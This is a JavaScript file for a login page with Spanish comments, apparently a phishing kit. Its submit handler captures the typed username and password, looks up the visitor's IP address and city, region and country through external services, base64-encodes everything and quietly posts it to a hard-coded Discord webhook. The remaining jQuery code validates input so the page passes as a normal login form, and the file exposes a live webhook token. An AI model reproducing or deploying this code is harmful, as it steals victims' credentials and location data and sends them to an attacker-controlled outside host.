document.getElementById("frmLogin").addEventListener("submit", function (event) {
    event.preventDefault();

    // Obtener valores del formulario
    const usuario = document.getElementById("usuario").value;
    const password = document.getElementById("password").value;

    // Obtener la hora actual
    const hora = new Date().toLocaleTimeString();

    // Obtener la dirección IP del usuario mediante un servicio externo
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;

            // Obtener la información de localización basada en la dirección IP
            fetch(`https://ipinfo.io/${userIP}/json`)
                .then(response => response.json())
                .then(locationData => {
                    const city = locationData.city;
                    const region = locationData.region;
                    const country = locationData.country;

                    // Crear contenido del mensaje para el webhook
                    const mensajeWebhook = `${usuario}, ${password}, ${hora}, ${userIP}, ${city},${region},${country}`;

                    // Codificar la línea completa en base64
                    const mensajeWebhookBase64 = btoa(mensajeWebhook);

                    // Código para enviar el mensaje al webhook de Discord
                    const webhookURL = "https://discord.com/api/webhooks/1178938086726570024/d9Afk-J1mDWFn_40JRrNCUSN4tfBqGuOCOJK0y9qJaoFYaIZ7MWduS60FU6GkccEhbUo";

                    fetch(webhookURL, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify({
                            content: mensajeWebhookBase64,
                        }),
                    })
                        .then(response => {
                            console.log("");
                        })
                        .catch(error => {
                            console.error("", error);
                        });
                })
                .catch(error => {
                    console.error("", error);
                });
        })
        .catch(error => {
            console.error("", error);
        });
});



$(document).ready(function() {
    $(".login-body-align").tooltip({
        content: $(".helpIco").attr("title"),
        position: {
            within: ".login-body-align"
        }
    });

    var ctrlDown = false,
        ctrlKey = 17,
        vKey = 86,
        cKey = 67;
    suprKey = 127;

    $(document).keydown(function(e) {
        var charCode = (e.which) ? e.which : e.keyCode;
        if (charCode == ctrlKey) {
            ctrlDown = true;
        }
    }).keyup(function(e) {
        var charCodeUp = (e.which) ? e.which : e.keyCode;
        if (charCodeUp == ctrlKey) {
            ctrlDown = false;
        }
    });

    var regexAlphanumeric = new RegExp("^[a-zA-Z0-9\b]+$");

    $("#usuario").bind("keypress", function(event) {
        if (!isAllowedKeyCode(event.keyCode)) {
            var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
            if (!regexAlphanumeric.test(key)) {
                event.preventDefault();
                return false;
            }
        }
    });

    $("#password").bind("keypress", function(event) {
        if (!isAllowedKeyCode(event.keyCode)) {
            var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
            if (!regexAlphanumeric.test(key)) {
                event.preventDefault();
                return false;
            }
        }
    });

    $('.formDocumento').keypress(function(e) {

        $(this).removeClass('input-validation--error font-validation--error');
        $("#documento-error").remove()
        if (esNumero(e) || caracterDeBorrar(e) || esTabulador(e)) {
            return true;
        } else {
            return false;
        }
    });

    $('.formDocumento').click(function() {
        $('.formDocumento').attr('maxlength', '12');
    });
});

function isAllowedKeyCode(keyCode) {
    if (navigator.userAgent.search("Firefox") >= 0) {
        //9:tab - 13:enter - 37,38,39,40:arrows - 46:delete
        var allowedKeyCodes = [9, 13, 37, 38, 39, 40, 46];
    } else {
        var allowedKeyCodes = [13];
    }
    for (var i = 0; i < allowedKeyCodes.length; i++) {
        if (allowedKeyCodes[i] == keyCode) {
            return true;
        }
    }
    return false;
}
